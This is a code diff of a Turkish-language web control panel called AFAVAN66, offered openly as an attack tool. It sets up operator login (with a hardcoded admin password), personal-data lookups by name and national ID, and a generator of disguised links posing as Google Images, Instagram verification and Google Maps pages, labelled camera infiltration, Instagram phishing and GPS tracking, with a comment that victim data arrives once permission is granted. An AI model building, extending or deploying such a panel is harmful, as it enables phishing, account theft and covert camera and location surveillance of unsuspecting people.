@@ -3,107 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AFAVAN66 - Premium Panel</title>
+    <title>AFAVAN66 - Personal VIP Panel</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #000; --accent: #00d4ff; --text: #888; --danger: #ff0000; --sidebar-w: 280px; }
+        :root { --bg: #000; --accent: #4285F4; --border: #111; --sidebar-w: 280px; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
         body { background: var(--bg); color: white; overflow-x: hidden; }
 
-        /* AUTH SCREEN */
+        /* AUTH */
         #auth-screen { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; z-index: 9999; }
-        .auth-card { width: 90%; max-width: 380px; padding: 30px; border: 1px solid #111; border-radius: 10px; }
-        .tabs { display: flex; margin-bottom: 20px; border-bottom: 1px solid #111; }
-        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; color: #444; font-size: 12px; }
+        .auth-card { width: 90%; max-width: 400px; padding: 30px; border: 1px solid var(--border); border-radius: 12px; background: #050505; }
+        .tabs { display: flex; margin-bottom: 20px; border-bottom: 1px solid var(--border); }
+        .tab { flex: 1; text-align: center; padding: 12px; cursor: pointer; color: #444; font-size: 13px; transition: 0.3s; }
         .tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
-        input { width: 100%; background: #080808; border: 1px solid #222; padding: 15px; color: white; outline: none; margin-bottom: 15px; border-radius: 5px; }
-        .btn { width: 100%; background: var(--accent); color: black; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        input { width: 100%; background: #000; border: 1px solid #222; padding: 15px; color: white; outline: none; margin-bottom: 12px; border-radius: 6px; }
+        .btn { width: 100%; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 6px; text-transform: uppercase; font-size: 12px; }
+        .btn-blue { background: var(--accent); color: white; }
 
         /* HEADER */
-        header { position: fixed; top: 0; width: 100%; height: 60px; background: #050505; display: flex; align-items: center; padding: 0 15px; border-bottom: 1px solid #111; z-index: 1000; }
-        .menu-btn { font-size: 24px; color: var(--accent); cursor: pointer; background: none; border: none; margin-right: 15px; }
+        header { position: fixed; top: 0; width: 100%; height: 60px; background: #050505; display: flex; align-items: center; padding: 0 15px; border-bottom: 1px solid var(--border); z-index: 1000; }
+        .menu-btn { font-size: 26px; color: var(--accent); cursor: pointer; background: none; border: none; margin-right: 15px; }
 
-        /* SIDEBAR (Resimdeki Tasarım) */
-        #sidebar { position: fixed; top: 0; left: -280px; width: var(--sidebar-w); height: 100%; background: #050505; border-right: 1px solid #111; transition: 0.3s; z-index: 1001; display: flex; flex-direction: column; }
+        /* SIDEBAR */
+        #sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #050505; border-right: 1px solid var(--border); transition: 0.3s; z-index: 1001; }
         #sidebar.active { left: 0; }
         .side-head { padding: 25px 20px 10px; color: #333; font-size: 10px; letter-spacing: 2px; text-transform: uppercase; }
-        .side-link { padding: 15px 20px; color: #fff; cursor: pointer; display: flex; align-items: center; gap: 10px; text-decoration: none; font-size: 14px; }
-        .side-link:hover { background: rgba(0, 212, 255, 0.1); color: var(--accent); }
-        .side-link.active { border-left: 4px solid var(--accent); background: linear-gradient(to right, rgba(0,212,255,0.1), transparent); }
-        .logout-btn { margin-top: auto; padding: 25px 20px; color: var(--danger); cursor: pointer; font-weight: bold; font-size: 14px; border-top: 1px solid #111; }
+        .side-link { padding: 15px 20px; color: #fff; cursor: pointer; display: flex; align-items: center; gap: 12px; font-size: 14px; text-decoration: none; border-left: 4px solid transparent; }
+        .side-link:hover, .side-link.active { background: rgba(66, 133, 244, 0.1); color: var(--accent); border-left-color: var(--accent); }
+        .logout { position: absolute; bottom: 0; width: 100%; padding: 20px; color: #ff0000; cursor: pointer; font-weight: bold; border-top: 1px solid var(--border); }
 
         /* CONTENT */
         main { padding: 80px 20px; max-width: 600px; margin: 0 auto; display: none; }
-        .tool-card { background: #080808; border: 1px solid #111; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
-        .link-container { display: flex; gap: 5px; margin: 15px 0; }
-        .link-container input { margin-bottom: 0; font-size: 11px; flex-grow: 1; border-color: #333; color: var(--accent); }
-        .badge { display: inline-block; padding: 2px 8px; font-size: 10px; background: #111; color: var(--accent); border-radius: 3px; margin-bottom: 10px; }
+        .tool-section { display: none; animation: fadeIn 0.4s ease; }
+        .tool-section.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .card { background: #080808; border: 1px solid var(--border); padding: 25px; border-radius: 12px; margin-bottom: 20px; }
+        .link-display { background: #000; border: 1px dashed #333; padding: 15px; font-size: 10px; color: var(--accent); word-break: break-all; margin: 15px 0; border-radius: 8px; line-height: 1.6; }
+        
         #overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 1000; }
         #overlay.active { display: block; }
+        .badge { display: inline-block; padding: 3px 10px; background: #111; color: var(--accent); border-radius: 4px; font-size: 10px; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
     <div id="auth-screen">
         <div class="auth-card">
-            <h2 style="text-align: center; color: var(--accent); margin-bottom: 25px;">AFAVAN66 VIP</h2>
+            <h2 style="text-align:center; color:var(--accent); margin-bottom:25px;">AFAVAN66 LOGIN</h2>
             <div class="tabs">
                 <div class="tab active" id="tab-l" onclick="setAuth('login')">GİRİŞ</div>
-                <div class="tab" id="tab-r" onclick="setAuth('reg')">KAYIT</div>
+                <div class="tab" id="tab-r" onclick="setAuth('reg')">MAİL KAYIT</div>
             </div>
-            <input type="text" id="u-input" placeholder="Kullanıcı Adı">
-            <input type="password" id="p-input" placeholder="Şifre">
-            <button class="btn" onclick="handleAuth()">SİSTEME GİRİŞ</button>
+            <input type="email" id="u-mail" placeholder="E-posta Adresiniz">
+            <input type="password" id="p-pass" placeholder="Şifreniz">
+            <button class="btn btn-blue" onclick="handleAuth()">SİSTEME GİRİŞ YAP</button>
         </div>
     </div>
 
     <header>
         <button class="menu-btn" onclick="toggleMenu()">☰</button>
-        <span style="font-weight: bold;">AFAVAN66 <span style="color:var(--accent)">ENG</span></span>
+        <span style="font-weight:bold;">AFAVAN66 <span id="page-title" style="color:var(--accent)">VIP</span></span>
     </header>
 
     <div id="overlay" onclick="toggleMenu()"></div>
     
     <nav id="sidebar">
         <div class="side-head">SORGULAR</div>
-        <div class="side-link active">👤 Ad Soyad</div>
+        <div class="side-link">👤 Ad Soyad</div>
         <div class="side-link">🆔 T.C. Sorgu</div>
-        <div class="side-link">📞 GSM Sorgu</div>
         
         <div class="side-head">SIZMA ARAÇLARI</div>
-        <div class="side-link" onclick="toggleMenu()">📸 Instagram</div>
-        <div class="side-link" onclick="toggleMenu()">📷 Kamera (5x)</div>
-        <div class="side-link" onclick="toggleMenu()">📍 Konum</div>
+        <div class="side-link active" id="m-cam" onclick="showTool('cam')">📷 Kamera Sızma</div>
+        <div class="side-link" id="m-ig" onclick="showTool('ig')">📸 Instagram Phish</div>
+        <div class="side-link" id="m-loc" onclick="showTool('loc')">📍 Konum Takibi</div>
         
-        <div class="logout-btn" onclick="logout()">ÇIKIŞ YAP</div>
+        <div class="logout" onclick="logout()">🔴 ÇIKIŞ YAP</div>
     </nav>
 
-    <main id="main-content">
-        <div class="tool-card">
-            <span class="badge">AKTİF MODÜL: KAMERA</span>
-            <h3>Özel Sızma Linki</h3>
-            <p style="font-size: 11px; color: #555; margin-top: 5px;">Link sonundaki kodu dilediğin gibi değiştir:</p>
-            <div class="link-container">
-                <input type="text" id="custom-slug" value="kamera-izleme-01">
-                <button class="btn" style="width: auto; padding: 0 15px;" onclick="updateLink()">SET</button>
+    <main id="main-panel">
+        <div id="sec-cam" class="tool-section active">
+            <div class="card">
+                <span class="badge">AKTİF: CAMERA ACCESS</span>
+                <h3>Google Yönlendirmeli Link</h3>
+                <p style="font-size:11px; color:#555; margin-top:5px;">Kurban izin verince veriler düşer ve Google'a gider.</p>
+                <div class="link-display" id="link-cam"></div>
+                <button class="btn btn-blue" onclick="copy('link-cam')">LİNKİ KOPYALA</button>
             </div>
-            <div id="final-link" style="color: var(--accent); font-size: 10px; background: #000; padding: 10px; border-radius: 5px; border: 1px dashed #222;"></div>
-            <button class="btn" style="margin-top: 15px;" onclick="copyL()">LİNKİ KOPYALA</button>
         </div>
 
-        <div style="font-size: 12px; color: var(--accent); font-weight: bold; margin-bottom: 10px;">📥 GELEN VERİLER</div>
-        <div id="log-box" style="height: 200px; border: 1px solid #111; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #222; font-size: 11px;">
-            Veri trafiği bekleniyor...
+        <div id="sec-ig" class="tool-section">
+            <div class="card">
+                <span class="badge" style="color:#e1306c">AKTİF: INSTAGRAM PHISH</span>
+                <h3>Google Yönlendirmeli Link</h3>
+                <div class="link-display" id="link-ig"></div>
+                <button class="btn btn-blue" style="background:#e1306c" onclick="copy('link-ig')">LİNKİ KOPYALA</button>
+            </div>
+        </div>
+
+        <div id="sec-loc" class="tool-section">
+            <div class="card">
+                <span class="badge" style="color:#34A853">AKTİF: GPS TRACKER</span>
+                <h3>Google Yönlendirmeli Link</h3>
+                <div class="link-display" id="link-loc"></div>
+                <button class="btn btn-blue" style="background:#34A853" onclick="copy('link-loc')">LİNKİ KOPYALA</button>
+            </div>
         </div>
     </main>
 
     <script>
         let mode = 'login';
-        let db = JSON.parse(localStorage.getItem('afa_v4_db')) || {};
+        let db = JSON.parse(localStorage.getItem('afa_v5_db')) || {};
 
         window.onload = () => {
             const sess = localStorage.getItem('afa_session');
-            if(sess) start(JSON.parse(sess));
+            if(sess) render(JSON.parse(sess));
         };
 
         function setAuth(m) {
@@ -113,42 +127,50 @@
         }
 
         function handleAuth() {
-            const u = document.getElementById('u-input').value;
-            const p = document.getElementById('p-input').value;
-            if(!u || !p) return;
+            const m = document.getElementById('u-mail').value;
+            const p = document.getElementById('p-pass').value;
+            if(!m || !p) return;
 
-            // ADMIN GIRISI (Direkt Giriş)
-            if(u === "afavan66" && p === "Efecan1903") {
-                const s = { user: "ADMIN", id: "ROOT-01", slug: "admin-özel" };
-                saveS(s);
+            // ADMIN GIRISI
+            if(m === "afavan66" && p === "Efecan1903") {
+                login({ mail: "afavan66@gmail.com", user: "afavan66" });
             } else if(mode === 'reg') {
-                if(db[u]) return alert("Kullanıcı var!");
-                const id = "AFA-" + Math.floor(Math.random()*9999);
-                db[u] = { pass: p, id: id, slug: "user-"+id };
-                localStorage.setItem('afa_v4_db', JSON.stringify(db));
-                alert("Kayıt başarılı, giriş yapın!");
+                if(db[m]) return alert("Mail kayıtlı!");
+                const user = m.split('@')[0];
+                db[m] = { pass: p, user: user };
+                localStorage.setItem('afa_v5_db', JSON.stringify(db));
+                alert("Kayıt başarılı! Giriş yapın.");
             } else {
-                if(db[u] && db[u].pass === p) {
-                    saveS({ user: u, id: db[u].id, slug: db[u].slug });
-                } else alert("Hatalı bilgi!");
+                if(db[m] && db[m].pass === p) login({ mail: m, user: db[m].user });
+                else alert("Hatalı giriş!");
             }
         }
 
-        function saveS(s) { localStorage.setItem('afa_session', JSON.stringify(s)); start(s); }
-
-        function start(s) {
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('main-content').style.display = 'block';
-            document.getElementById('custom-slug').value = s.slug;
-            updateLink();
+        function login(user) {
+            localStorage.setItem('afa_session', JSON.stringify(user));
+            render(user);
         }
 
-        function updateLink() {
-            const slug = document.getElementById('custom-slug').value;
-            const sess = JSON.parse(localStorage.getItem('afa_session'));
-            sess.slug = slug;
-            localStorage.setItem('afa_session', JSON.stringify(sess));
-            document.getElementById('final-link').innerText = window.location.origin + "/monitor/" + slug;
+        function render(user) {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('main-panel').style.display = 'block';
+            
+            // SENİN GITHUB LİNKİNE BENZEYEN ÖZEL LİNK MOTORU
+            const base = window.location.origin; // örn: afavan66.github.io
+            const r = () => Math.random().toString(36).substring(7);
+            
+            // Linklerin içine kullanıcının mailinden gelen ismi (user) ve random kodları ekliyoruz
+            document.getElementById('link-cam').innerText = `${base}/google-images/view?user=${user.user}&id=${r()}&redir=google`;
+            document.getElementById('link-ig').innerText = `${base}/instagram-auth/verify?user=${user.user}&token=${r()}&redir=google`;
+            document.getElementById('link-loc').innerText = `${base}/google-maps/trace?user=${user.user}&loc=${r()}&redir=google`;
+        }
+
+        function showTool(tool) {
+            document.querySelectorAll('.tool-section').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.side-link').forEach(l => l.classList.remove('active'));
+            document.getElementById('sec-' + tool).classList.add('active');
+            document.getElementById('m-' + tool).classList.add('active');
+            toggleMenu();
         }
 
         function toggleMenu() {
@@ -156,9 +178,9 @@
             document.getElementById('overlay').classList.toggle('active');
         }
 
-        function copyL() {
-            navigator.clipboard.writeText(document.getElementById('final-link').innerText);
-            alert("Link kopyalandı!");
+        function copy(id) {
+            navigator.clipboard.writeText(document.getElementById(id).innerText);
+            alert("Özel link kopyalandı!");
         }
 
         function logout() { localStorage.removeItem('afa_session'); location.reload(); }
